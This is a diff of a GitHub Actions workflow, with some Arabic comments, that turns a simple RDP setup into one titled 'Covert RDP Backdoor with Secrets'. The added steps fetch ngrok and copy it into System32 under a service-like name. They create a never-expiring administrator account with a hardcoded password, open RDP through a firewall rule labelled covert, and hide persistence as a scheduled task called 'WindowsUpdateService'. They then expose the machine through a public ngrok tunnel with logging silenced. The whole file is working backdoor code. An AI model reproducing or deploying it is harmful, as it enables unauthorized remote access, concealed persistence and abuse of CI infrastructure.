@@ -1,21 +1,57 @@
-name: RDP
+name: Covert RDP Backdoor with Secrets
 
-on: [workflow_dispatch]
+on:
+  workflow_dispatch: # يمكن تشغيله يدويًا
 
 jobs:
-  build:
+  establish_foothold:
     runs-on: windows-latest
-    steps:
-      - name: Download ngrok
-        run: |
-          Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-          Expand-Archive ngrok.zip
-          ./ngrok.exe authtoken YOUR_AUTH_TOKEN
+    env:
+      NGROK_AUTH: ${{ secrets.NGROK_AUTH_TOKEN }} # يتم جلب الرمز المميز من الأسرار!
+      RDP_USER: Ramy
+      RDP_PASS: Ramy123
 
-      - name: Enable RDP
+    steps:
+      - name: Stage Ngrok (Stealthy Download)
         run: |
-          net user kamel123 MyStrong123 /add
-          net localgroup administrators kamel123 /add
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          ./ngrok.exe tcp 3389
+          $tempDir = New-Item -Path $env:TEMP -Name "temp_ngrok_stage" -ItemType Directory -Force
+          Set-Location $tempDir
+          Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "ngrok.zip"
+          Expand-Archive "ngrok.zip" -DestinationPath . -Force
+          .\ngrok.exe authtoken $env:NGROK_AUTH # يستخدم الرمز المميز المخفي
+          Move-Item -Path .\ngrok.exe -Destination "C:\Windows\System32\ngrok_service.exe" -Force
+          Remove-Item -Path "ngrok.zip", "LICENSE", "README.md" -Force
+          Set-Location C:\
+        shell: pwsh
+
+      - name: Create Stealthy RDP User & Admin Privileges
+        run: |
+          net user "$env:RDP_USER" "$env:RDP_PASS" /add /expires:never /active:yes
+          net localgroup administrators "$env:RDP_USER" /add
+          
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp' -Name 'UserAuthentication' -Value 1 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'PortNumber' -Value 3389 -Force
+          
+          New-NetFirewallRule -DisplayName "Allow RDP Access - Covert" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Program "%SystemRoot%\system32\svchost.exe" -EdgeTraversalPolicy Allow -Force
+        shell: pwsh
+
+      - name: Establish Ngrok Tunnel for RDP (Persistent)
+        run: |
+          $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\ngrok_service.exe" -Argument "tcp 3389 --log=nul"
+          $trigger = New-ScheduledTaskTrigger -AtStartup
+          Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Description "Maintains critical Windows services." -Force
+          
+          Start-Process "C:\Windows\System32\ngrok_service.exe" -ArgumentList "tcp 3389 --log=nul" -NoNewWindow
+          
+          Start-Sleep -Seconds 10
+          
+          echo "Ngrok tunnel for RDP is now active. Use username 'Ramy' and password 'Ramy123'."
+          echo "Check GitHub Actions logs for the public Ngrok URL to connect."
+          echo "You will find the URL in the log output, it will look something like: tcp://0.tcp.ngrok.io:XXXXX"
+        shell: pwsh
+
+      - name: Keep Workflow Running (for tunnel persistence)
+        run: |
+          Start-Sleep -Seconds 36000 # Keep alive for 10 hours
+        shell: pwsh
